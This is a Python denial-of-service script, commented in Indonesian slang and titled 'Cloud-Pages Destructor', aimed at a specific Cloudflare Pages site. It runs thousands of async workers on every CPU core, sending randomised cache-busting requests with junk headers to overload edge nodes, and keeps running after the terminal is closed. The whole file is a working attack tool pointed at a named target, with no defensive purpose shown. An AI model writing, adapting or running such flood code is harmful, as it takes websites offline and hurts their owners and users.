import asyncio
import aiohttp
import random
import string
import multiprocessing

# --- TARGET CLOUD-PAGES ---
TARGET = "https://harbrand.pages.dev/"

def rs(l=50): return ''.join(random.choices(string.ascii_letters + string.digits, k=l))

async def edge_annihilator(session):
    while True:
        try:
            # Cloudflare Pages sangat kuat di static, tapi lemah kalau dipaksa 
            # mikirin path yang super dalam dan header yang berantakan.
            url = f"{TARGET}{rs(10)}/{rs(10)}?cache={rs(20)}&mode=extreme"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {rs(5)}",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": f"https://{rs(10)}.com/{rs(15)}",
                # Menggunakan header non-standar untuk membingungkan Edge Cache
                "X-Edge-Control": "no-cache",
                "X-Forwarded-Proto": "https",
                "TE": "trailers" 
            }

            # Kita kirim serangan 'Headless' untuk menghemat bandwidth lu 
            # tapi tetap memaksa Edge Node Cloudflare bekerja.
            async with session.get(url, headers=headers, timeout=5) as r:
                if r.status >= 400:
                    print(f"[⚡] EDGE STRESSED! Status: {r.status}")
                else:
                    print(f"[*] Probing Edge Node... | Status: {r.status}")
                
                # Siksa koneksi dengan membaca buffer sangat kecil
                await r.content.read(5)
        except:
            await asyncio.sleep(0.001)

def start_engine():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def ignite():
        # PC 20 Core lu harus pake 5000+ task untuk Cloudflare Pages
        conn = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=1000)
        async with aiohttp.ClientSession(connector=conn) as sess:
            tasks = [edge_annihilator(sess) for _ in range(4000)]
            await asyncio.gather(*tasks)
    loop.run_until_complete(ignite())

if __name__ == "__main__":
    print("🌌 THE EVENT HORIZON - CLOUD-PAGES DESTRUCTOR 🌌")
    print(f"Target: {TARGET} | Non-Stop Online Mode")
    
    # Gaspol semua 20 Core!
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=start_engine, name=f"EdgeCore-{i}")
        p.daemon = True # BIAR ONLINE TERUS WALAUPUN TERMINAL DITUTUP
        p.start()
        print(f"[+] Launching Edge-Core {i}...")

    multiprocessing.Event().wait()
